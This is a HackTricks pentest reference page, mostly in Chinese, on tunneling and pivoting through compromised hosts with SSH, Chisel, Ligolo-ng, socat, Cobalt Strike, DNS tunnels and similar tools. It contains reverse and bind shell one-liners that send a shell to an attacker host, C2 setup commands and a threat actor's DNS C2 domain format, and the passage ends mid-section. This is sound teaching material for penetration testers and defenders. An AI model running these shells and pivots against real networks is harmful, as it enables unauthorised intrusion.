# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap 提示

> [!WARNING]
> Nmap 的 proxy 支持仅限于 TCP 连接，不会影响 ping、端口或 OS-detection 扫描。当 scanner 位于 SOCKS proxy 后时，**禁用主机发现**（`-Pn`）并使用 **TCP connect scan**（`-sT`）。<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

最终命令使用 Evil-WinRM 的 `-u` 和 `-i` 选项来标识账户和 WinRM 主机；其默认 WinRM 端口为 5985。<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH 可以通过其加密通道转发 X11 连接、任意 TCP 端口和 Unix-domain sockets。<sup>[[6]](#references)</sup>

SSH 图形连接（X）

`-Y` 启用受信任的 X11 forwarding，`-C` 请求对转发数据进行压缩。<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

在 SSH Server 中打开新 Port --> 其他 Port

Remote（`-R`）forwarding 在 SSH Server 上监听并连接到本地端；显式绑定地址控制哪些接口可以访问该监听器。<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

本地端口 --> Compromised host (SSH) --> 第三台主机:端口

本地（`-L`）forwarding 在客户端上监听，并从 SSH server 端连接到目标。<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

本地端口 --> 已攻陷主机 (SSH) --> 任意位置

Dynamic (`-D`) forwarding creates a local SOCKS4/SOCKS5 listener whose connections are opened from the remote side.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### 使用 ProxyJump 进行多跳

`-J`/`ProxyJump` 通过一个或多个以逗号分隔的跳板主机连接到目标。转发选项仍属于最终的 SSH 连接，因此下面的 SOCKS listener 会从 `internal-target` 访问目标，而不是从第一个 bastion 访问。这样无需登录跳板主机并在那里启动第二个 SSH client。<sup>[[6]](#references)</sup>
```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```
跳板机的特定主机选项应放置在 `~/.ssh/config` 中；面向目标主机的命令行配置不会自动应用于中间主机。<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

这对于通过 DMZ 从内部主机向你的主机获取 reverse shells 很有用：

服务器的 `GatewayPorts` 设置控制远程转发是否可以绑定到 loopback 之外；其默认值为 `no`。<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

此基于 root 的示例会在两台主机上创建 tunnel 设备。服务器必须允许 tun forwarding，且选定的 account 必须能够访问 tun 设备；`PermitRootLogin yes` 是在此处使用 `root` account 的一种方式。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
在 Server 端启用转发
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
在客户端设置一条新路由
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 添加了 strict-KEX 扩展，以应对 Terrapin 的早期传输完整性攻击。尽可能更新两端，并遵循针对旧实现的厂商指导，不要仅凭版本号就假定 forwarded channel 受到保护。<sup>[[8]](#references)</sup>

## SSHUTTLE

你可以通过 **ssh** 将所有前往某个 **subnetwork** 的 **traffic** 经由一台主机进行 **tunnel**。\
例如，将所有前往 10.10.10.0/24 的 traffic 进行转发。

`sshuttle` 通过 SSH 提供透明代理，并支持选择子网和自定义 SSH command，如下所示。<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
使用私钥连接
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit 的 `portfwd` 支持本地和远程转发，而其 SOCKS proxy module 用于配合 session routes 或 `autoroute`，在这些示例中默认监听端口 1080。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

本地端口 --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
另一种方法：
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike 的 Beacon 可以通过 Beacon 中继 SOCKS4a/SOCKS5 连接；`rportfwd` 在 compromised host 上绑定，而 `rportfwd_local` 则从 Cobalt Strike client 发起到目标的连接。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

在 Team Server 上应通过 Beacon 路由流量的接口中开放一个端口。<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 在这种情况下，**端口是在 Beacon 主机上开放的**，而不是在 Team Server 上开放的；流量会被发送到 Team Server，然后再从那里转发到指定的 host:port。<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
reverse-forwarding 手册指出了以下行为：<sup>[[14]](#references)</sup>

- Beacon 的 reverse port forward 用于**将流量隧道传输到 Team Server，而不是在各台机器之间进行中继**。
- 流量会**封装在 Beacon 的 C2 流量中**，包括 P2P 链接。
- 高位端口通常可以避免特权端口限制，但目标 OS 策略和现有监听器仍然适用。

### rPort2Port local

> [!WARNING]
> 在这种情况下，**端口是在 Beacon 主机上开放的**，而不是在 Team Server 上；**流量会发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从该客户端发送到指定的 host:port。<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## BOFScale - CDN 前置的进程内 tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) 在 Windows C2 implant 内运行修改版 Tailscale overlay，无需安装 TUN driver 或 service。它由三个组件组成：异步 CGo `c-shared` `tailscaled` BOF-PE、一个与本地 API 通信的小型 C++ BOF-PE，以及一个异步的 `socksportfwd` TCP-to-SOCKS5 bridge。<sup>[[53]](#references)[[54]](#references)</sup>

### 兼容 CDN 的 TS2021 和 DERP

Tailscale 通常使用专有的 HTTP upgrades 处理基于 Noise 的 TS2021 control channel 和 DERP relay。BOFScale 保留这些字节流，但通过 RFC 6455 WebSockets 传输，并使用 `Sec-WebSocket-Protocol: ts2021` 或 `derp`，因此由 operator 控制的 Headscale/DERP origin 可以置于仅接受标准 WebSocket upgrades 的 CDN 后方。修改后的 client 在 HTTP `500` 后通过 WebSockets 重试 TS2021，在 HTTP `426` 后重试 DERP，并使 DERP WebSocket dialer 遵循 host proxy 配置；BOF 设置 `TS_DEBUG_DERP_WS_CLIENT=1` 以跳过已知会失败的首次尝试。<sup>[[53]](#references)[[54]](#references)</sup>

CDN 和 origin proxy 必须为 `/ts2021` 和 `/derp` 保留 WebSocket upgrades，将 `/key` 作为普通 HTTP 转发，并禁用内部读写超时，因为 relay sessions 可能无限期保持开启。提供的 Headscale 配置启用 `verify_clients`，仅发布 operator 内嵌的 DERP map，并将 `derp.urls` 留空，以防回退到 Tailscale 运营的 relays。<sup>[[53]](#references)[[54]](#references)</sup>

### 进程内 daemon 和 named-pipe 控制

除非另有覆盖，BOF entry point 会使用 `-tun=userspace-networking`、`-state mem:` 和 `-no-logs-no-support` 启动 `tailscaled`，然后创建一个以 UUID 命名的 pipe。它通过 OS pipe 将 Go stdout/stderr 重定向到 Beacon output API，因此完整的 daemon 和 Go runtime 会一直驻留，但 state 和 logs 不会写入 Tailscale directory。<sup>[[53]](#references)[[54]](#references)</sup>

轻量级 client 通过该 pipe 复现 Tailscale 的 HTTP/1.0 local API。它使用 `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` 打开 pipe，因为 daemon 的 `safesocket` layer 会 impersonate pipe client；它发送 `Tailscale-Cap: 125`，并将 local API 映射到 `up`、`down`、`status`、route advertisement 和 shutdown 操作。<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> 在要求 daemon 关闭后，不要卸载手动 mapped 的 Go BOF-PE：runtime 和 garbage-collector goroutines 可能继续从 loader 已解除映射的内存中执行。应在 sacrificial process 中运行 `tailscaled`，并终止该 process 以完成最终清理。<sup>[[54]](#references)</sup>

### 通过 userspace SOCKS5 转发由 host 发起的流量

入站 tailnet connections 和 advertised subnet routes 可在 userspace network stack 内工作，但被攻陷 host 上的普通 processes 没有进入该 overlay 的 OS route。因此，`socksportfwd` 会监听一个面向 victim 的 TCP port，使用 daemon 的 `0.0.0.0:1080` listener 协商 SOCKS5 `NO AUTH`，为 tailnet destination 发出 `CONNECT`，并异步 relay 双向流量。当 target 是 MagicDNS name 时，它使用 `ATYP_DOMAIN`，使 `tailscaled` 解析该 name，而不会将其暴露给 Windows resolver。<sup>[[53]](#references)[[54]](#references)</sup>

下面展示了最小 operator flow；operator node 和 implant 都必须使用 patched binaries，因为 stock Tailscale 无法通过此 CDN design。<sup>[[53]](#references)[[54]](#references)</sup>
```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```
本地 forward 可以将表面上的 authentication listener 与 relay tool 分离：诱使一台机器向被攻陷主机的绑定端口进行 authentication，通过 tailnet 将其转发至 `ntlmrelayx`，再 relay 到 AD CS、LDAP、HTTP、SMB 或其他兼容目标。有关特定漏洞阶段，请参阅 [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) 和 [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)；BOFScale 仅负责传输。<sup>[[54]](#references)</sup>

### 检测

应搜索这些特征的组合，而不是单个较弱的指标：在通常并非基于 Go 的进程中发现 Go runtime，带有宽松 SDDL `D:(A;;GA;;;WD)` 的 UUID pipe，异常的 `0.0.0.0:1080` SOCKS listener，以及持续时间很长、连接至 CDN 地址的 TLS WebSockets。进行 TLS inspection 时，如果拥有该连接的进程并非经授权的 `tailscaled` service，则应标记 `Sec-WebSocket-Protocol: derp` 或 `ts2021`。该 repository 的 `bofscale.yar` rules 为全部三个 BOF-PE 组件提供了内存 signatures。<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

该项目提供 `tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp` 和 `tunnel.php` 等 web tunnel endpoints；在启动本地 proxy 前，先上传一个受支持的 endpoint。<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel 通过 HTTP 携带 TCP/UDP 流量，并使用 SSH 保护连接；请使用兼容的客户端/服务器构建版本，并确认所选 release 的命令语法。<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### 端口转发
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) 通过 WebSocket、HTTP/2 或 WebTransport（基于 QUIC 的 HTTP/3）承载静态或动态转发。当前构建支持 TCP、UDP、Unix sockets、stdio、SOCKS5、HTTP 代理，以及 Linux 透明代理监听器，并同时支持正向和反向模式。<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

在攻击者端运行 server，并使用 `-R` 使 pivot 建立出站连接。在此方向中，SOCKS5 监听器创建于 **server** 上，而请求的连接则源自 **client/pivot** 网络。<sup>[[52]](#references)</sup>
```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
-R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```
反向静态转发使用相同的方向。例如，以下命令会将 pivot 可访问的 `10.10.10.20:445` 暴露在攻击者回环地址的 `8445` 端口上：<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### 出站和传输详情

- 在客户端添加 `-p http://user:pass@proxy:8080` 以通过显式 HTTP proxy。在 `curl` 等客户端中使用 `socks5h://127.0.0.1:1080`（或在应用程序中启用 proxied DNS），使内部名称在 tunnel 的另一端解析，而不是泄露给本地 resolver。<sup>[[52]](#references)</sup>
- `wss://` 选择受 TLS 保护的 WebSocket。`https://` 客户端选择 HTTP/2，但 reverse proxy/CDN 的 buffering 或 HTTP/1 转换通常会破坏双向 stream；测试此模式时，应直接暴露 wstunnel server。<sup>[[52]](#references)</sup>
- `wts://` 选择基于 QUIC 的 WebTransport。使用 `--enable-webtransport`（或 `wts://` listen URL）启动 server，并允许监听端口上的 UDP。此模式无法穿过传统 HTTP `CONNECT` proxy，因为该 proxy 传输的是 TCP。<sup>[[52]](#references)</sup>

> [!WARNING]
> 上游项目警告，不要将其内置的 self-signed certificate 视为隐私保护措施。优先使用有效的自定义 certificate 以及 `--tls-verify-certificate`（或 mTLS），除非有意提供远程访问，否则应将 proxy listener 保持在 loopback 上；当机密性很重要时，应 tunnel 已经安全的协议。<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng quickstart 介绍了 proxy 上的 TUN interface、对 agent 的 certificate-fingerprint validation，以及 tunneled network 的 route setup。<sup>[[17]](#references)</sup>

### 隧道
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent 绑定与监听

Ligolo-ng 可以在 agent 上添加监听器，将流量转发到 proxy 端地址，并且可以路由其保留的 `240.0.0.0/4` 网段，以访问 agent 本地服务。<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### 访问 Agent 的本地端口
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot 从受害者端启动反向隧道，并在攻击者的回环地址上暴露一个 SOCKS4 代理；其 README 还记录了 NTLM-proxy 凭据和哈希选项。<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
通过 **NTLM proxy** 进行 Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat 可组合 `TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL` 和 `PROXY` 等 address types；以下示例组合了这些已记录的 endpoints。<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port 通过 socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### 通过 SSL Socat 的 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
你可以使用 socat 文档中介绍的 `PROXY` address type 穿过**无需身份验证的 proxy**，方法是在受害者的控制台中执行此行，而不是执行上一行。<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

在两端创建证书：客户端和服务器
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

将本地 SSH 端口（22）连接到攻击者主机的 443 端口
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink 是 PuTTY 的命令行连接工具，提供与 `ssh` 类似的 SSH forwarding 选项。<sup>[[22]](#references)</sup>

SSH 端口使用大写的 `-P`。`-pw` 为兼容性而保留，但会在进程列表中暴露密码；在可行时，优先使用 key authentication 或 `-pwfile`。<sup>[[22]](#references)[[23]](#references)</sup>

由于该 binary 将在受害者的机器上执行，并且它是一个 SSH client，因此需要为 reverse connection 开放 SSH service 和端口；下面使用 `-R` 将一个本地可访问的端口转发到攻击者的机器。<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

创建或修改持久化 `portproxy` 规则时，请使用具有主机所需权限的上下文。Microsoft 记录了下方使用的 `v4tov4` 添加、显示和删除形式。<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

你需要在系统上拥有 **RDP 访问权限**。\
下载：

SocksOverRDP 使用 Remote Desktop Dynamic Virtual Channels，通过现有的 RDP 会话传输 SOCKS5 连接；客户端插件监听 `127.0.0.1:1080`，而服务器组件运行在 RDP 目标主机上。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows Remote Desktop Service 功能中的 `Dynamic Virtual Channels`（`DVC`）。DVC 负责**通过 RDP 连接隧道传输数据包**。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

在客户端计算机上按如下方式加载 **`SocksOverRDP-Plugin.dll`**：
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
现在我们可以使用 **`mstsc.exe`** 通过 **RDP** **连接**到 **victim**，此时应会收到一条 **提示**，说明 **SocksOverRDP plugin** 已启用，并且它将在 **127.0.0.1:1080** 上 **listen**。

通过 **RDP** **连接**，然后将 `SocksOverRDP-Server.exe` 二进制文件上传并在 victim machine 中执行：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
现在，在你的机器（attacker）上确认端口 1080 正在监听：
```
netstat -antb | findstr 1080
```
现在可以使用 [**Proxifier**](https://www.proxifier.com/) 通过该端口 proxy 流量。<sup>[[26]](#references)</sup>

## Proxify Windows GUI Apps

你可以使用 [**Proxifier**](https://www.proxifier.com/) 让 Windows GUI 应用通过 proxy 访问。<sup>[[26]](#references)</sup>\
在 **Profile -> Proxy Servers** 中添加 SOCKS server 的 IP 和端口。\
在 **Profile -> Proxification Rules** 中添加要进行 proxify 的程序名称，以及要进行 proxify 的目标 IP 连接；Proxifier 规则可以匹配应用程序、目标主机和端口。<sup>[[27]](#references)</sup>

## Tunnel through an NTLM proxy

前面提到的工具 **Rpivot** 可以通过 NTLM-authenticating proxy relay。配置 auth file 和 NTLMv2 method 后，**OpenVPN** 也可以通过此类 proxy 路由；这属于 proxy traversal，而不是绕过 proxy authentication。<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm 可向上游 NTLM proxies 进行身份验证，公开本地 listeners，并可将本地 tunnel 端口映射到目标服务；随后客户端即可使用该本地端口。<sup>[[29]](#references)</sup>\
例如，将端口 443 转发
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
现在，例如，如果你将受害者上的 **SSH** 服务设置为监听 443 端口，就可以通过攻击者的 2222 端口连接到它。<sup>[[29]](#references)</sup>\
你也可以使用一个连接到 localhost:443 的 **meterpreter**，同时让攻击者监听 2222 端口。<sup>[[29]](#references)</sup>

## YARP

YARP（Yet Another Reverse Proxy）是 Microsoft 的 .NET reverse-proxy toolkit。你可以在此处找到它：[https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine 通过 DNS queries 创建 IPv4 tunnel，并使用 TUN interfaces；文档中所述的配置要求两端都具备创建这些 interfaces 所需的权限。<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS transport 的开销高于 direct TCP，通常速度较慢；你可以使用以下方式通过此 tunnel 创建压缩的 SSH connection：<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**从这里下载**](https://github.com/iagox86/dnscat2)**。**

Dnscat2 通过 DNS 建立加密的 command-and-control 通道；下面的 server 和 client 命令遵循其文档中的用法。<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **在 PowerShell 中**

你可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 PowerShell 中运行 dnscat2 client；其 README 记录了如下所示的 `Start-Dnscat2` 参数。<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **使用 dnscat 进行端口转发**

Dnscat2 的交互式 `listen` 命令将本地监听器映射到远程主机和端口。<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### 更改 proxychains DNS

Proxychains-ng 会 hook 动态链接的 TCP 连接，无法承载 UDP 或 ICMP；DNS proxying 可配置，因此应检查已安装的 `proxychains.conf` 和 resolver helper，而不是假定固定的公共 resolver。Legacy `proxyresolv` scripts 提供 `PROXY_DNS_SERVER` 用于选择 resolver；需要解析内部名称时，应使用从 pivot 可访问的 resolver。<sup>[[34]](#references)[[35]](#references)</sup>

## Go 中的 Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor 创建了一个 **双通道 C2（"AK47C2"）**，仅滥用出站 **DNS** 和 **普通 HTTP POST** 流量——这两种协议在企业网络中很少被阻断。<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• 生成一个随机的 5 字符 SessionID（例如 `H4T14`）。
• 为 *task requests* 添加前缀 `1`，为 *results* 添加前缀 `2`，然后连接不同字段（flags、SessionID、computer name）。
• 每个字段都使用 ASCII key `VHBD@H` 进行 **XOR-encrypted**，再进行 hex-encoded，并用点号连接——最后以攻击者控制的 domain 结尾：

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
